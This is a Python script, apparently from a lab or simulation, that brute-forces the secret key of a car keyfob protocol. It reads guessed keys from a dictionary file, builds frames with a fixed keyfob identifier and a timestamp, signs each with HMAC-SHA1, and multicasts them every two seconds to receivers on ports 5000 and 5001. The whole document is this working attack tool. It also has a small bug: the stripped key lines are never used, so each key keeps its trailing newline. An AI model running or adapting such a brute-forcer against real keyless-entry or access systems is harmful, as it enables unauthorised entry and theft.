import socket
import struct
import datetime
import time
import hmac

class BruteForce:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ttl = struct.pack('b', 1)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)

        self.KEY_DICT = []
        file_path = 'bruteforcedictionary.txt'

        with open(file_path, 'r') as file:
            content = file.readlines()
            for line in content:
                line.strip()
                self.KEY_DICT.append(line)

        self.KEY_COUNT = len(self.KEY_DICT)

    def run(self):
        try:
            receiver_1 = '224.0.0.1'
            port_1 = 5000

            receiver_2 = '224.0.0.1'
            port_2 = 5001

            while True:
                time.sleep(2)

                sof = "0D"  # start of frame
                identifier = "A1D16B"  # keyfob identifier
                date_time = str(hex(int(time.time())))

                message = ''
                message += sof
                message += identifier
                message += date_time

                self.KEY_COUNT = self.KEY_COUNT - 1
                mac = str(hmac.new(key=self.KEY_DICT[self.KEY_COUNT - 1].encode(), msg=message.encode(), digestmod="sha1").hexdigest())

                if self.KEY_COUNT == 0:
                    self.KEY_COUNT = len(self.KEY_DICT)
                    print('Key counter reset!!')

                message += mac

                self.sock.sendto(message.encode(), (receiver_1, port_1))
                self.sock.sendto(message.encode(), (receiver_2, port_2))
                print("Brute force initiated.")

        except Exception as e:
            print("Error: ", e)
        finally:
            self.sock.close()

if __name__ == "__main__":
    brute_force_instance = BruteForce()
    brute_force_instance.run()
